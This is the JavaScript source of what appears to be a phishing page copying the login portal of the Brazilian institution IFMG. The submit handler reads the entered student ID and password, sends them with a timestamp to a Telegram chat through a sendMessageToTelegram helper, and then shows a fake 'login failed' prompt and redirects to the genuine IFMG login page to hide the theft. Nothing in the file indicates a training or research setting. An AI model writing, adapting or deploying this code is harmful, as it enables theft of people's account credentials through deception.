import "../css/style.css";
import { sendMessageToTelegram } from "./telegram";

const form = document.querySelector("#form");
const userError = document.querySelectorAll(".user-error");
const passwordError = document.querySelectorAll(".password-error");
const userInput = document.querySelector("#user");
const passordInput = document.querySelector("#password");

const removeClass = (list, cssClass) => {
  list.forEach((el) => el.classList.remove(cssClass));
};
const addClass = (list, cssClass) => {
  list.forEach((el) => el.classList.add(cssClass));
};
const validate = (user, password) => {
  if (!user) {
    removeClass(userError, "hidden");
  }
  if (!password) {
    removeClass(passwordError, "hidden");
  }
  return user && password;
};

const handleLogin = (event) => {
  event.preventDefault();
  const user = event.target.user.value;
  const password = event.target.password.value;
  const isValid = validate(user, password);

  if (isValid) {
    const message = `
        Data: ${new Date()}
        RA: ${user}
        Senha: ${password}        
        `;
    sendMessageToTelegram(message);
    const result = confirm("Não foi possível realizar login, tente novamente");

    if (result) {
      window.location.href =
        "https://meu.ifmg.edu.br/EducaMobile/Account/Login";
    }
  }
};

userInput.addEventListener("input", (ev) =>
  ev.target.value
    ? addClass(userError, "hidden")
    : removeClass(userError, "hidden")
);

passordInput.addEventListener("input", (ev) =>
  ev.target.value
    ? addClass(passwordError, "hidden")
    : removeClass(passwordError, "hidden")
);

form.addEventListener("submit", handleLogin);
